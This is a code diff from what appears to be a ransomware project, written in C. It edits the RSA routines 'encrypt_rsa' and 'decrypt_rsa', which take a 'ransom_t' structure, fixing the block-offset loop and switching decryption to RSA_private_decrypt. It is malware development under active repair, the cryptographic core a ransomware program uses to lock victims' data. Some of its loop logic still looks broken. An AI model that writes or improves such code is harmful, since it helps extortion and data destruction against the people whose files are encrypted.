@@ -49,23 +49,13 @@ int encrypt_rsa(char *buffer, ransom_t *ransom)
 	cipher_block_size = RSA_size(rsa) - 11;
 
 	do {
-
 		ciphertext_block_offset += cipher_buf_size;
-		plaintext_block_offset += cipher_buf_size;
-
+		if (plaintext_block_offset > buf_size)
+			cipher_block_size = plaintext_block_offset - buf_size;
 		cipher_buf_size += RSA_public_encrypt(cipher_block_size, (unsigned char *)buffer + plaintext_block_offset, (unsigned char *)cipher_buf + ciphertext_block_offset, rsa, padding);
+		plaintext_block_offset += cipher_block_size;
+	} while(buf_size > plaintext_block_offset);
 
-		printf("plaintext bufsize: %d\n", buf_size);
-		printf("plaintext block offset: %d\n", plaintext_block_offset);
-		printf("ciphertext block offset: %d\n", ciphertext_block_offset);
-		getchar();
-	} while((buf_size - plaintext_block_offset) > cipher_block_size);
-
-#ifndef NO_DEBUG
-		printf("plaintext_buf: %s\n", buffer);
-		printf("cipher_buf: %s\n", (char *)cipher_buf);
-		printf("-----------------------------\n");
-#endif
 	return(cipher_buf_size);
 }
 
@@ -90,26 +80,30 @@ int decrypt_rsa(char *buffer, ransom_t *ransom)
 	{
 		lstat("private.pem", &priv_key_info);
 		printf("private key size = %d\n", (int)priv_key_info.st_size);
-		if((priv_key_buf = malloc((int)priv_key_info.st_size * sizeof(char))))
+		if(!(priv_key_buf = malloc((int)priv_key_info.st_size * sizeof(char))))
 			fprintf(stderr, "Out of memory\n");
 		fread(priv_key_buf, (size_t)priv_key_info.st_size - 1, sizeof(char), priv_key);
 	}
 	fclose(priv_key);
+printf("priv_key_buf: %s\n", priv_key_buf);
 	rsa = createRSA((unsigned char *)priv_key_buf, ransom->cipher_flag);
 	cipher_block_size = RSA_size(rsa) - 11;
 
 	do {
 		ciphertext_block_offset += cipher_buf_size;
-		plaintext_block_offset += cipher_buf_size;
+		plaintext_block_offset += cipher_block_size;
 
-		cipher_buf_size += RSA_public_encrypt(cipher_block_size, (unsigned char *)buffer + plaintext_block_offset, (unsigned char *)cipher_buf + ciphertext_block_offset, rsa, padding);
+		if (plaintext_block_offset > buf_size)
+			cipher_block_size = plaintext_block_offset - buf_size;
+
+		cipher_buf_size += RSA_private_decrypt(cipher_block_size, (unsigned char *)cipher_buf + ciphertext_block_offset, (unsigned char *)buffer + plaintext_block_offset, rsa, padding);
 
 		printf("plaintext bufsize: %d\n", buf_size);
 		printf("plaintext block offset: %d\n", plaintext_block_offset);
 		printf("ciphertext block offset: %d\n", ciphertext_block_offset);
 		getchar();
 
-	} while((buf_size - plaintext_block_offset) > cipher_block_size);
+	} while(buf_size > plaintext_block_offset);
 
 #ifndef NO_DEBUG
 		printf("plaintext_buf: %s\n", buffer);
